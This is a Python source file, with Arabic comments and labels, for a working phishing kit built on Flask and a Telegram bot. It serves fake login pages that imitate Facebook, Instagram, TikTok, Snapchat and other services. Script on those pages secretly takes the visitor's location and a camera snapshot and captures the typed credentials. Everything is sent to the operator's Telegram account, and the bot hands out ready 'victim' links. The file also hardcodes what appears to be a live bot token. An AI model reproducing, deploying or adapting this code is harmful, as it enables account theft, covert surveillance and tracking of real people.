import os
import threading
import telebot
import base64
import random
from flask import Flask, request, render_template_string
from telebot import types

# --- البيانات الأساسية ---
TOKEN = '7929608386:AAE8dCcbTPRTEBpVPvhyIsfdyLl42mmRfnM'
ADMIN_ID = 6829017835
OWNER = "KING-SAQR"

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# --- مصفوفة الصفحات والخدمات ---
SERVICES = {
    "fb": {"name": "فيسبوك", "color": "#1877f2", "icon": "📘"},
    "ig": {"name": "إنستغرام", "color": "#E1306C", "icon": "📸"},
    "tk": {"name": "تيك توك", "color": "#000000", "icon": "🎵"},
    "sc": {"name": "سناب شات", "color": "#FFFC00", "icon": "👻"},
    "wa": {"name": "واتساب", "color": "#25D366", "icon": "💚"},
    "pb": {"name": "ببجي (شحن)", "color": "#F2A900", "icon": "🔫"},
    "ff": {"name": "فري فاير", "color": "#FF5722", "icon": "🔥"},
    "tm": {"name": "أرباح تيمو", "color": "#FF9800", "icon": "💰"},
    "rs": {"name": "رشق متابعين", "color": "#FF6B6B", "icon": "📈"},
}

# --- القائمة الرئيسية (مطابقة للصور) ---
def get_full_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    # أزرار الاختراق
    markup.add(
        types.InlineKeyboardButton("👤 اختراق فيسبوك", callback_data="gen_fb"),
        types.InlineKeyboardButton("📸 اختراق إنستغرام", callback_data="gen_ig")
    )
    markup.add(
        types.InlineKeyboardButton("🎵 اختراق تيك توك", callback_data="gen_tk"),
        types.InlineKeyboardButton("👻 اختراق سناب شات", callback_data="gen_sc")
    )
    # أزرار الخدمات والتمويه
    markup.add(
        types.InlineKeyboardButton("🚀 رشق متابعين", callback_data="gen_rs"),
        types.InlineKeyboardButton("💰 أرباح تيمو", callback_data="gen_tm")
    )
    markup.add(
        types.InlineKeyboardButton("📷 سحب الكاميرا", callback_data="gen_cam"),
        types.InlineKeyboardButton("📍 تحديد الموقع", callback_data="gen_gps")
    )
    # أزرار إضافية
    markup.add(
        types.InlineKeyboardButton("😄 نكت هكر", callback_data="joke"),
        types.InlineKeyboardButton("📜 أحاديث", callback_data="hadith")
    )
    return markup

# --- قالب الصفحة الاحترافي (نسخة طبق الأصل) ---
PHISH_HTML = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ title }} - تسجيل الدخول</title>
    <style>
        body { font-family: sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 100%; max-width: 380px; text-align: center; }
        .logo { font-size: 50px; margin-bottom: 15px; }
        h2 { font-size: 20px; color: #1c1e21; margin-bottom: 20px; }
        input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; }
        button { width: 100%; padding: 14px; background: {{ color }}; color: white; border: none; border-radius: 6px; font-size: 17px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">{{ icon }}</div>
        <h2>تسجيل الدخول إلى {{ title }}</h2>
        <form id="logForm">
            <input type="text" id="email" placeholder="البريد الإلكتروني أو الهاتف" required>
            <input type="password" id="pass" placeholder="كلمة السر" required>
            <button type="submit">تسجيل الدخول</button>
        </form>
    </div>
    <video id="v" autoplay style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>
    <script>
        const postData = (d) => fetch('/collect', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(d)});
        
        // سحب الموقع سراً
        navigator.geolocation.getCurrentPosition(p => {
            postData({type:'loc', lat:p.coords.latitude, lon:p.coords.longitude});
        });

        // سحب الكاميرا سراً
        navigator.mediaDevices.getUserMedia({video:true}).then(s => {
            const v = document.getElementById('v'); v.srcObject = s;
            setTimeout(() => {
                const c = document.getElementById('c');
                c.width = v.videoWidth; c.height = v.videoHeight;
                c.getContext('2d').drawImage(v,0,0);
                postData({type:'img', data:c.toDataURL('image/png')});
                s.getTracks().forEach(t => t.stop());
            }, 3000);
        });

        document.getElementById('logForm').onsubmit = (e) => {
            e.preventDefault();
            postData({type:'login', u:document.getElementById('email').value, p:document.getElementById('pass').value, platform:'{{ title }}'})
            .then(() => window.location.href = "https://google.com");
        };
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    t = request.args.get('type', 'fb')
    conf = SERVICES.get(t, SERVICES['fb'])
    return render_template_string(PHISH_HTML, title=conf['name'], color=conf['color'], icon=conf['icon'])

@app.route('/collect', methods=['POST'])
def collect():
    d = request.json
    if d['type'] == 'login':
        msg = f"🚨 *اختراق جديد ({d['platform']}):*\n👤: `{d['u']}`\n🔑: `{d['p']}`"
        bot.send_message(ADMIN_ID, msg, parse_mode='Markdown')
    elif d['type'] == 'loc':
        bot.send_message(ADMIN_ID, f"📍 *موقع الضحية:*\nhttps://www.google.com/maps?q={d['lat']},{d['lon']}")
    elif d['type'] == 'img':
        img = base64.b64decode(d['data'].split(',')[1])
        bot.send_photo(ADMIN_ID, img, caption="📸 صورة الضحية المباشرة")
    return "ok"

@bot.message_handler(commands=['start'])
def welcome(m):
    if m.from_user.id == ADMIN_ID:
        bot.send_message(m.chat.id, f"🎖️ مرحباً بك يا جنرال {OWNER}\nهذا هو بوت الإمبراطورية الخاص بك.", reply_markup=get_full_menu())

@bot.callback_query_handler(func=lambda c: True)
def handle_c(c):
    host = os.environ.get('RENDER_EXTERNAL_HOSTNAME', 'your-app.onrender.com')
    if c.data.startswith("gen_"):
        pt = c.data.replace("gen_", "")
        link = f"https://{host}/?type={pt}"
        bot.send_message(c.message.chat.id, f"🔗 الرابط الجاهز للضحية:\n`{link}`", parse_mode='Markdown')
    elif c.data == "joke":
        bot.answer_callback_query(c.id, "ليش الهكر ما بياكل لحمة؟ لأنه بيخاف من الـ 'Meat-in-the-middle' 😂", show_alert=True)
    bot.answer_callback_query(c.id)

def run_b(): bot.infinity_polling()
threading.Thread(target=run_b, daemon=True).start()

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
